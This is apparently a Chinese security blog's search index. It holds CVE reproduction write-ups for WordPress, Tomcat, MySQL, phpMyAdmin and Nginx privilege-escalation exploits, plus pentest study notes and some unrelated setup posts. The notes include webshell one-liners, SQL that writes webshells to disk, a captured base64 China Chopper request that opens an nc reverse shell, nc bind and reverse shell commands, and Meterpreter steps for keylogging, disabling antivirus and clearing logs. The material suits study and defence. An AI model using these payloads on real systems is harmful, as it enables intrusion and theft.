<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MacOS python27 pycurl安装]]></title>
    <url>%2Farchives%2F366a0bef.html</url>
    <content type="text"><![CDATA[MacOS安装pycurl的时候出了一堆问题：SSL、Permitted等，用网上的一堆方法都无法成功安装。最后，通过查看pycurl官网文档、网上资料结合，终于安装成功！前言一开始使用easy_install、pip两种安装方式都会遇到SSL报错。查询网上资料，指定openssl的环境变量并指定使用openssl安装也无法解决。解决过程下载pycurl源码，解压到对应目录。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl其中”openssl-dir”需要根据自身电脑安装路径进行设置。使用上诉命令会出现权限不够的问题，通过添加–user可以解决。sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl --user总结MacOS安装东西真麻烦！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>pycurl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-5487分析]]></title>
    <url>%2Farchives%2F5a5cf5bb.html</url>
    <content type="text"><![CDATA[针对Content Injection Vulnerability in WordPress进行复现并分析。漏洞简述由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。漏洞分析复现过程下载POC脚本，运行即可。原理分析查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。在99行使用了update_item和update_item_permissions_check。查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。PHP语言中做类型的比较和转换时，其会返回整数。例如例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。修改前：修改后：复现注意事项在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。修复建议升级WordPress至4.7.2及以上。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-8735分析]]></title>
    <url>%2Farchives%2Fc77f03de.html</url>
    <content type="text"><![CDATA[针对CVE-2016-8735复现并分析。漏洞简述Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。漏洞分析复现过程1java -cp ysoserial-0.0.5-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exePOC分析根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。修复建议升级Tomcat改变JMX密码认证]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6663分析]]></title>
    <url>%2Farchives%2Fe5fd1c70.html</url>
    <content type="text"><![CDATA[针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。漏洞简述存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。漏洞分析复现过程查看数据库版本:mysql -V。建立低权限数据库用户，并新建库。下载CVE-2016-6663 POC，并编译。查看当前用户id.运行CVE-2016-6663 POC。下载CVE-2016-6664 POC 并更改权限。运行CVE-2016-6664 POC。原理分析MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。复现注意事项缺少mysql.h，安装libmysqlclient-dev。修复建议升级MySQL；在my.cnf中添加：symbolic-links = 0。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-6662分析]]></title>
    <url>%2Farchives%2F438a17c4.html</url>
    <content type="text"><![CDATA[针对MySQL Code Execution Privilege Escalation进行漏洞复现并分析。漏洞简述在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。漏洞分析复现过程下载cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c，并放同一目录下（.so文件运行py时会自动生成）。修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。运行py脚本。1python cve-2016-6662_MySQL_RCE_exploit.py -dbuser root -dbpass '' -dbname pocdb -dbhost 127.0.0.1 -mycnf /etc/mysql/my.cnf这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。重启mysql服务，成功反弹shell。原理分析默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。在my.cnf中写入malloc_lib加载so文件的路径。使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。复现注意事项/etc/mysql/my.cnf权限设置：12chown mysql:root /etc/mysql/my.cnfchmod 600 /etc/mysql/my.cnf攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。123mysql -uroot -p；use pocdb;（攻击database的数据库名字）drop table poctable;py脚本会自动运行nc，因此攻击服务器需要安装nc。如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。12parser.add_argument('-dbport', dest='TARGET_PORT', required=True, help='MySQL port') # 74行dbconn = mysql.connector.connect(user=args.TARGET_USER, password =args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST, port=args.TARGET_PORT) # 83行修复建议升级MySQL。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-5734分析]]></title>
    <url>%2Farchives%2F94f683da.html</url>
    <content type="text"><![CDATA[针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。漏洞简述phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。漏洞分析复现过程下载POC并执行即可。漏洞分析这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。在661行getReplacePreview函数调用了getRegexReplaceRows。在613行findAction函数调用了getReplacePreview。在175行indexAction函数调用了findAction，当searchType为replace调用findAction。在/tbl_find_replace.php第33行调用indexAction。根据以上可得知，调用getRegexReplaceRows函数的流程为：12345/tbl_find_replace.ph →/libraries/controllers/table/TableSearchController.php indexAction() →/libraries/controllers/table/TableSearchController.php findAction() →/libraries/controllers/table/TableSearchController.php getReplacePreview() →/libraries/controllers/table/TableSearchController.php _getRegexReplaceRows()当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。修复建议升级phpMyAdmin。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1240分析]]></title>
    <url>%2Farchives%2F29004be5.html</url>
    <content type="text"><![CDATA[针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。漏洞简述Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。漏洞分析复现过程获取POC脚本，运行POC脚本。1./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。重启Tomcat服务。1serverce tomcat7 restartPOC分析POC脚本85行判断用户是否为tomcat用户。93行判断指定的tomcat日志文件是否存在。158行删除日志文件并软链接到/etc/ld.so.preload。168行判断/etc/ld.so.preload文件是否存在。188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。199行删除/etc/ld.so.preload和/tmp/privesclib.so。跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。修复建议升级Tomcat。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3 pip缺失VC++]]></title>
    <url>%2Farchives%2Ff62064af.html</url>
    <content type="text"><![CDATA[最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。VC++缺失使用pip install scrapy安装scrapy出现缺失VC++。根据报错信息打开VC Build Tools站点点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。接下来安静等待安装完成。安装完成之后，再使用pip install scrapy即可成功安装。]]></content>
      <categories>
        <category>Code</category>
        <category>Python36</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python36</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go-VSCode环境搭建]]></title>
    <url>%2Farchives%2Fc70ca2a9.html</url>
    <content type="text"><![CDATA[最近项目上用到了Go，因此对VSCode进行Go环境搭建。效果图如下：GoGo安装去Golang官网下载对应版本的安装包，我这里是Windows操作系统，因此下载go1.10.2.windows-amd64.msi。由于Golang官网需要科学上网，如果没有翻墙的软件，可以去Go语言中文网下载，下载页面。安装过程直接Next过去即可。安装完成之后，打开CMD输入go version查看go 版本信息。Go环境配置Go安装完成之后，在CMD下输入go env查看go的环境变量。有两个关键的变量：GOROOT、GOPATH。GOROOT为Go安装目录不需要进行修改，GOPATH为Go项目地址可以进行修改。在喜欢的地方建立一个Go项目目录。这里我在C盘根目录下建立一个文件夹，名称为GoWork。然后将其配置到系统环境变量中。配置完成之后，重新打开一个CMD输入go env查看是否生效。到此Go的配置告一段落。VSCodeVSCode安装去Visual Studio Code官网下载对应版本的安装包安装即可。安装过程直接Next过去即可。VSCode安装完成之后需要配置Git，可以查看这篇文章搭建博客，这里就不展开了。VSCode环境配置Go插件安装在VSCode商店里面安装对应Go插件。可以直接通过VSCode欢迎使用页面的自定义→工具和语言→更多进行跳转。安装完成之后打开Go项目文件夹，新建一个hello.go，打开hello.go，在右小角进行点击Install All安装所依赖的库（该步骤需要翻墙）。安装完成之后，在工作目录下会多出一个bin子目录里面会放所需要的exe文件。如果翻不了墙，那么可以直接下载这个，放到Go项目文件夹下的bin目录即可。链接：https://pan.baidu.com/s/19w01LlfY8iEsLm5gJmP5Lw 密码：umaoDebug完成以上操作之后，可以通过F5进行Debug。总结在进行VSCode进行Go Debug时，遇到了几个需要注意点，在此记录一下供诸君参考：完成Go安装之后，需要进行GOPATH环境变量配置，便于项目目录查找；完成VSCode安装之后，在VSCode的终端里面输入go命令查看VSCode是否能调用系统环境变量。如果在VSCode终端找不到go命令，在用户环境变量里面进行添加可以解决该问题。假设还解决不了，直接在终端进行path环境变量追加set path=%path%;C:\go\bin；如果VSCode依赖的库安装失败，直接把src、bin、pkg目录都删除，然后重新安装。Go代码1234567package mainimport "fmt"func main() &#123; fmt.Println("Hello, Hywell")&#125;]]></content>
      <categories>
        <category>Code</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2016-1247分析]]></title>
    <url>%2Farchives%2Feca7756b.html</url>
    <content type="text"><![CDATA[针对CVE-2016-1247漏洞进行复现、研究分析原理。前言Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。漏洞简述Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。漏洞分析复现过程查看用户ID查看Nginx版本dpkg -l | grep -i nginx下载poc脚本1wget https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh修改poc权限,并执行poc12chmod 777 nginxed-root.sh./nginxed-root.sh /var/log/nginx/error.log查看现在用户IDPOC分析查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的根据POC进行利用分析，在145行使用dlsym获取euid在147、148行修改/tmp/nginxrootsh文件的所有者和权限在149行删除/etc/ld.so.preload文件在154行编译生成的c文件，在其后判断是否编译成功在162行将/bin/bash拷贝到/tmp/nginxrootsh在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）在199行将/etc/ld.so.preload权限设置为755注意事项root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。修复建议升级Nginx版本。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透笔记整理]]></title>
    <url>%2Farchives%2Fff82748e.html</url>
    <content type="text"><![CDATA[最近在整理印象笔记，其中有许许多多经验、研究和杂七杂八的想法，我会逐步上传到博客。渗透笔记CSRFCSRF全名是Cross-site request forgery，理解上为伪造其他用户执行操作。攻击网页没有token头字段，通过请求拦截的方式，将对应URL记录下来。通过构建一个恶意页面，恶意页面代码如下:1234567# GET类型&lt;img src="操作行为的URL"&gt; # POST类型&lt;form id="aa" action="操作行为的UR" method="post" name="form1"/&gt;&lt;input type="submit" name="button" id="button" style="display:none;"/&gt;&lt;script&gt;window.location = "http://x.x.x.x";&lt;/script&gt;诱使对应人员点击该页面即可触发CSRF攻击。防御思路针对CSRF攻击，防御方面：在重要操作执行钱需要进行验证码校验站点添加token（或者自定义）头字段。由于token是随机并且一次性。在使用post方法时，防止token出现在URL（可以通过构建恶意网站 使用户访问恶意网站 恶意网站在后台构建假冒用户操作）通过抓包删除referer 测试针对CSRF攻击总结：防御方面为对操作进行用户身份验证；攻击方面可以构建的代码：form iframe img xhr link等。攻击衍生可以将XSS与CSRF结合：通过XSS让用户跳转到CSRF页面执行恶意操作。SQL InjectionSQL Injection通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。攻击思路最简单的注入思路就是针对id=、class=这些参数进行注入。看到过一次二次注入的思路：注册用户时将用户名设置成注入语句，在个人中心处注入语句被调用形成注入。因此，允许输入与数据库交互那么便有可能存在注入。例如cookie等报文头里面的数据，如果数据库会记录该数据那变可能存在注入。攻击衍生当站点对输入进行过滤（防御），可以尝试使用编码转换，将注入语句转码。内网渗透内网渗透是指渗透人员获取了一台内网主机时，针对内网进行内网渗透的过程。123456789101112131415Windows# 查看用户权限whoami# 提权 pr # 开启远程桌面REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f# 查看计算机信息systeminfo# 获取密码mimikatz# 进程信息tasklist /svc # 查看端口 netstart -an上传漏洞IIS6.01.目录名称为a.asp，该目录下的文件都会以asp解析；2.上传a.asp;.xx.jpg类型的文件，由于IIS6.0解析”;”会截断，所以在解析时可以理解为以asp文件类型解析。IIS7.0/7.5+Nginx≤0.8.37IIS7.0/7.5，在PHP配置文件中，开启了cgi.fix_pathinfo（该配置默认开启），当文件为php类型，iis会交给php解析；nginx和iis7.5类似:Fast-CGI开启状况（默认），上传内容为:1&lt;?php fputs(fopen('cmd.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;的x.jpg。访问../../../x.jpg/.php会在根目录下生成一个cmd.php;在文本前面加上 Gif89a 让服务器以为该文本为图片类型文件;双文件上传 通过在上传&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;后面在加入&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;。下载网页源码 另存为到桌面 然后第一个地方上传正常图片 第二个地方上传马;上传一句话木马可以对一句话多次加密。上传成功之后，如果连接一句话被防护设备阻断，可以通过修改菜刀进行连接。原理是因为当前防护设备是针对网络流量进行识别，当流量中出现对应关键字会进入识别流程，当所有条件都满足时就会阻断该流量。该方式绕过方式千千万，只要特征不命中即可。SQL命令记录MySQL数据库在渗透的时候可以用到的命令：123456789101112131415161718192021222324252627282930# 导出文件Select '&lt;? php eval($_POST[cmd]);?&gt;' into outfile 'F:/wwwroot/eval.php';## 导出一句话create table cmd (a varchar(50));insert into cmd (a) values ('一句话木马');select * into [a] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;'from cmd;drop table cmd;Select 'asp一句话木马' into [vote] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 8.0;' fromvote;select into outfile(dumpfile); //MySQL写文件命令 (例如：select "&lt;?php echo 'test'; ?&gt;" into outfile "F:\\www\\test.php";）# 系统用户名system_user()# 用户名user()# 当前用户名current_user# 连接数据库的用户名session_user()# 数据库名database()# MYSQL数据库版本version()# MYSQL读取本地文件的函数load_file()# 读取数据库路径@@datadir# MYSQL 安装路径@@basedir# 操作系统@@version_compile_osPHP爆破路径1.错误参数爆路径2.google搜索： sieze:xxx.com warning size:xxx.com phpmyadmin(phpMyadmin3.测试文件爆路径 test.php ceshi.php info.php4.注入点读取配置文件 load_file小迪学习笔记我在刚刚接触渗透的时候，经常会看小迪的渗透教程视频。那时候，边学边记。小迪第一讲小迪第一讲主要讲解一下基础的知识，便于后期理解。软件：APMServ1234567891011# web环境iis6.0（Windows2003）iis7.X（win7 Windows2008）Apache（linux Windows）# 常见搭配asp + access + iisasp + sqlserver + iisphp + mysql + Apache tomcat jsp + sqlserver + tomcatjsp + oracle +tomcataspx + sqlserver + iis小迪第四讲一个页面 http://www.xxx.com/xxx.asp?id=xx,存在cookie注入。使用SQLMap进行攻击，命令如下：`sqlmap： sqlmap.py -u http://www.xxx.com/xxx.asp –cookie “id=xx” –level 2`小迪第五讲数字型注入：and 1=1。例如:select from admin where id=1字符型注入：&#39; and &#39;1&#39;=&#39;1,在代码处由于字符型需要加单引号或者双引号。例如:select from admin where a=&#39;a&#39;搜索型注入：%&#39;小迪第七讲通过 load_file 读取后台文件 例如：前台页面向后台login.php传递参数并判断然后跳转 这时候可以通过 load_file sql注入语句来读取login.php文件小迪第九讲服务器常见状态码：123451XX：正在处理2XX：成功3XX：重定向4XX：客户端错误 403：存在（没权限） 404：不存在5XX：服务器错误 500：可能存在小迪第十讲该课程主要讲解mssql综合利用工具，由于是工具利用，所以并没有详细记录。小迪第十一讲验证机制分为：本地、远程。本地验证可以通过禁用、删除等方式进行绕过。解析漏洞：1234567891011IIS6.0：文件名： 1.asp;.jpg文件夹：用户名为 1.asp 文件类型：1.jpgIIS7.X uginx：http://www.xxx.com/logo.gif解析漏洞:http://www.xxx.com/logo.gif/x/phpapache:首先是否系统能否解析的后缀名http://www.xxx.com/logo.php.asdasd 最后的后缀无法识别 便继续往前推小迪第十二讲IIS 解析漏洞利用path：a.asp;.,在上传的时候通过修改文件前缀。不单单是文件前缀，如果上传包中存在path，可以通过修改path。因为有时候验证是通过文件名filename，而不验证filepath。图片马使用UE（uedit）编辑器即可添加。小迪第十四讲针对上传绕过时，首先需要知道过滤方式。可通过多次上传来猜解其过滤方式。利用手段00截断：1.asp’\0’.jpg:通过UE将上传包保存为文本文档在上传文件名后面加上：空格 .jpg。例如 1.asp .jpg。通过UE将空格 20 修改为 00在上传包文本中 包长度 length 数值加5检验文件类型 通过抓包修改过滤不全 asp asa cer cdx htr检验文件头：在文件头前面加上 GIF89a工具一句话流量学习1234567891011# url执行命令POST /test.php HTTP/1.1X-Forwarded-For: 199.1.88.29Referer: http://192.168.168.147Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0Host: 192.168.168.147Content-Length: 569Cache-Control: no-cachecmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=L2Jpbi9zaA%3D%3D&amp;z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuYyAxOTIuMTY4LjEwLjExIDEzMzcgLWUgL2Jpbi9iYXNoO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3DNC工具123456正向连接： 服务器命令：nc -l -p 1337 -e /bin/bash 客服端使用：nc &gt;nc x.x.x.x 1337反向连接： 服务器命令：nc 192.168.10.11 1337 -e /bin/bash 客户发命令：nc -lvv -p 1337Metasploit-msfconsole工具Metasploit是一个优秀的渗透测试框架！！！！！！！攻击阶段：使用msfconsole打开Metasploit使用nmap扫描来发现开放端口nmap -T4 -A -v x.x.x.x使用search命令来搜索需要的exp使用use命令来打开exp，之后使用show options查看需要指定的参数使用set rhost等来设置参数之后，通过exploit来获取meterpreter会话信息收集阶段：获取服务器信息（sysinfo、getuid、idletime、run get_env、ifconfig、route）获取服务器当前截屏（screenshot）获取服务器进程信息（ps）将 meterpreter会话迁移至explorer（migrate）开启键盘记录，输出（keyscan_start、keyscan_dump）获取服务器shell（shell）检测服务器是否为虚拟机（run checkvm）启动远程桌面（run getgui -e）;启动telnet服务（run gettelnet -e）获取子网状况（run get_local_subnets）编辑hosts（run hostedit）查看已经登录的用户数（run enum_logged_on_users）获取已安装应用程序（run get_application_list）获取驱动器信息（run windows/gather/forensics/enum_drives）获取产品密钥（run windows/gather/enum_ms_product_keys）获取autologin（run windows/gather/credentials/windows_autologin）使用自动脚本获取系统信息（run winenum）获取服务器额外信息（run scraper；信息存放路径为：.msf5/logs/scrips/scraper/192.x.x.x.x）清理痕迹阶段：检测防火墙状态（run getcountermeasure）关闭杀毒软件（run killav；find / -name ‘killav.rb’；/usr/share/metasploit-framework/scripts/meterpreter/killav.rb）清理日志（clearev）NmapNmap常用命令汇总记录123456789101112131415161718192021222324252627Nmap常用命令参数讲解-d [level] (提高或设置调试级别) 。 -sT tcp端口扫描(完整三次握手)。-sU udp扫描。(不回应可能端口打开,回应是关闭) -sL dns反向解析。 -sM[fin ack mainmon扫描] 。-sS隐蔽扫描(半开syn)。-sP发现扫描网络存活主机。(直连arp非直连tcp80 icmp)-sO确定主机协议扫描。-sA tcp ACK扫描。-sW 对滑动窗口的扫描sI[idlescan]。-sR RPC扫描。(flag没有syn,ack,rst回送rst)-sN 关闭主机发现【空】。(不管是否存在直接扫描)-sF FIN扫描 。(sN sF sX逃避不了ids)-sX Xmas扫描 (fin psh urg为置位)。-sI 完全隐藏。【以一个跳板主机&#123;无流量&#125;扫描另一台主机】-sV 服务版本。-sC 跟安全有关的脚本-P0 指定协议。(不ping主机)(1icmp6tcp17udp47gre50esp51ah53swipe77sun-nd115l2tp120uti132sctp) -PS 端口列表用,隔开[tcp80 syn 扫描]-PA 端口列表用,隔开[ack扫描](PS+PA测试状态包过滤防火墙【非状态的PA可以过】)【默认扫描端口1-1024】-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]-PE [icmp ping types]-PM 掩码请求。-PR [arp ping] 默认直连用。-PN 自己。-PP 时间请求。GoogleHack使用Google搜索往往能获得意想不到的信息。1234567891011121314151617ps：不区分大小写all开头一次查询只能使用一个intext:关键词 （搜索页面正文包含关键词的网页）allintext:关键词,关键词 （拼接多个关键词）intitle:关键词 （搜索页面标题包含关键词的网页）allintitle:关键词,关键词 （拼接多个关键词）cache:url （搜索特定页面的快照）defind:关键词 （搜索关于关键词的定义，不能与其他操作符混用）filetype:关键词 （搜索所有以关键词为后缀的文件的url） ext:关键词 （性质与filetype一致）info: 搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用inurl:关键词 （搜索url中包含关键词的网页）allinurl:关键词,关键词 （搜索url中包含多个关键词的网页）site:url （将搜索范围缩小到特定的网站，域或子域）*（通配符）-（排除符号）]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[世界上最不能等待的事]]></title>
    <url>%2Farchives%2F595705f9.html</url>
    <content type="text"><![CDATA[世界上最不能等待的事不是不想不愿，只是没发现。今天晚上看了网易云音乐上面的《世界上最不能等待的事》MV，世界上有许许多多不能等待的事：工作、生活、友情、爱情、亲情等等。每个人不能把所有的方方面面都考虑到，像我这种处女座任何事情都想考虑的全面、具体。希望所有不能等待的事都能早早的去实现！]]></content>
      <categories>
        <category>诗和远方</category>
        <category>远方</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[想说给你听]]></title>
    <url>%2Farchives%2F3120f2c3.html</url>
